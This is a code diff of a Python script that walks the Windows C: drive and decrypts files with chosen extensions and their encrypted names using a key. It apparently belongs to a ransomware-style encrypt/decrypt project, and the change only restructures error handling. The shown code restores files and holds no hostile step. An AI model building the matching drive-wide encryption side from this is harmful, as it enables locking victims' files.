@@ -22,23 +22,26 @@ for root, dirs, files in walk("C:\\"):
 
         # Decrypting only files with specific extension
         if ext in extensions:
-            with open(fpath, "rb") as of:
-                encrypted: bytes = of.read()
-
-            decrypted = f.decrypt(encrypted)
-
-            # Check key
             try:
-                with open(fpath, "wb") as of:
-                    of.write(decrypted)
+                with open(fpath, "rb") as of:
+                    encrypted: bytes = of.read()
 
-                # Decrypting filename
-                filename = f.decrypt(file.encode())
-                newpath: str = root + "\\" + filename.decode()
-                rename(fpath, newpath)
+                decrypted = f.decrypt(encrypted)
+
+                # Check key
+                try:
+                    with open(fpath, "wb") as of:
+                        of.write(decrypted)
+
+                    # Decrypting filename
+                    filename = f.decrypt(file.encode())
+                    newpath: str = root + "\\" + filename.decode()
+                    rename(fpath, newpath)
+                except:
+                    MessageBox(
+                        "The inserted key is wrong.",
+                        MB_ICONWARNING
+                    )
+                    break
             except:
-                MessageBox(
-                    "The inserted key is wrong.",
-                    MB_ICONWARNING
-                )
-                break
+                pass
